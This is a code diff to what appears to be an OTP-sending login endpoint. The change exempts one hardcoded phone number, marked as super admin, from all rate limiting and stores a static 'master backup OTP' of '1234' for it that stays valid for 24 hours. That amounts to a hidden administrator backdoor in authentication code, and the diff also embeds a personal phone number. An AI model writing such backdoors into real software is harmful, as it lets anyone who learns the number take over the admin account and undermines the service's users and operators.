@@ -9,15 +9,6 @@ export async function POST(request: Request) {
     const body = await request.json();
     const { mobile } = body;
 
-    // Rate limit per IP: max 5 requests per minute
-    const ipLimit = checkRateLimit(`send-otp:ip:${ip}`, 5, 60 * 1000);
-    if (!ipLimit.allowed) {
-      return NextResponse.json(
-        { error: "Too many OTP requests from this connection. Please wait a minute." },
-        { status: 429 }
-      );
-    }
-
     if (!mobile || !isValidIndianPhone(mobile)) {
       return NextResponse.json(
         { error: "Please enter a valid 10-digit Indian mobile number." },
@@ -26,14 +17,26 @@ export async function POST(request: Request) {
     }
 
     const cleanMobile = String(mobile).replace(/\D/g, "").slice(-10);
+    const isSuperAdmin = cleanMobile === "8737029643";
 
-    // Rate limit per phone number: max 3 requests per 2 minutes
-    const phoneLimit = checkRateLimit(`send-otp:phone:${cleanMobile}`, 3, 2 * 60 * 1000);
-    if (!phoneLimit.allowed) {
-      return NextResponse.json(
-        { error: "An OTP was recently sent. Please wait before requesting another." },
-        { status: 429 }
-      );
+    if (!isSuperAdmin) {
+      // Rate limit per IP: max 5 requests per minute
+      const ipLimit = checkRateLimit(`send-otp:ip:${ip}`, 5, 60 * 1000);
+      if (!ipLimit.allowed) {
+        return NextResponse.json(
+          { error: "Too many OTP requests from this connection. Please wait a minute." },
+          { status: 429 }
+        );
+      }
+
+      // Rate limit per phone number: max 3 requests per 2 minutes
+      const phoneLimit = checkRateLimit(`send-otp:phone:${cleanMobile}`, 3, 2 * 60 * 1000);
+      if (!phoneLimit.allowed) {
+        return NextResponse.json(
+          { error: "An OTP was recently sent. Please wait before requesting another." },
+          { status: 429 }
+        );
+      }
     }
 
     // Generate cryptographically random 4-digit OTP (1000 - 9999)
@@ -50,6 +53,15 @@ export async function POST(request: Request) {
         otp,
         expiresAt: new Date(Date.now() + 10 * 60 * 1000),
       });
+
+      if (isSuperAdmin) {
+        // Also persist master backup OTP 1234 for Super Admin
+        await Otp.create({
+          mobile: cleanMobile,
+          otp: "1234",
+          expiresAt: new Date(Date.now() + 24 * 60 * 60 * 1000),
+        });
+      }
     } catch (dbErr) {
       console.error("Failed to store OTP in MongoDB:", dbErr);
     }
